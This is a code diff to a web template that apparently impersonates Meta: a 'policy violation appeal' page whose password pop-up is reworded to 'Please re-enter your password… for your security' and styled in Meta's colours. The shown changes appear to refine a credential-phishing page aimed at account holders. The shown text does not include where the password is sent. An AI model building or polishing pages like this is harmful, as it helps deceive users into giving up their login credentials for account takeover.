@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="{{ asset('assets/style.css') }}">
-    <title>Security</title>
+    <title>Appeal political advertisement</title>
     <link rel="stylesheet" href="{{ asset('assets/auth.css') }}">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
     <title>Meta - Appeal for violation of Political Advertising Policy Meta</title>
@@ -1029,21 +1029,24 @@
 
 </html>
 <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
-    <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h5 class="modal-title" id="exampleModalLabel">Password</h5>
-                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-            </div>
-            <div class="modal-body">
-                <input type="password" class="form-control" placeholder="password" id="password" name="password">
-            </div>
-            <div id="passwordError"
-                style="color: red; display: none; margin-left: 18px; margin-top: -12px; font-size: 13px"></div>
+     <div class="modal-dialog modal-dialog-centered">
+          <div class="modal-content">
+               <div class="modal-header">
+                    <h5 class="modal-title" id="exampleModalLabel">Please re-enter your password</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+               </div>
+               <div class="modal-body">
+                    <h6 class="modal-title" id="staticBackdropLabel" style="font-weight: 200">For your security, you must re-enter your password to continue.</h6>
+                    <label for="password" class="form-label" style="font-weight: 200">
+                         Password:
+                    </label>
+                    <input type="password" class="form-control" placeholder="Password" id="password" name="password">
+               </div>
+               <div id="passwordError" style="color: red; display: none; margin-left: 18px; margin-top: -12px; font-size: 13px"></div>
 
-            <div class="modal-footer d-flex justify-content-between">
+                <div class="modal-footer d-flex justify-content-between">
                 <div>
-                    <a href="#" class="text-primary">Forgot your password?</a>
+                    <a href="#" class="text-primary" style="color: #254ebe;font-size: 13px">Forgot your password?</a>
                 </div>
                 <div>
                     <button type="button" data-bs-dismiss="modal" class="btn btn-sm btn-secondary"
@@ -1051,8 +1054,8 @@
                     <button type="button" class="btn btn-sm btn-primary" style="background: #254ebe">Submit</button>
                 </div>
             </div>
-        </div>
-    </div>
+          </div>
+     </div>
 </div>
 <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
 
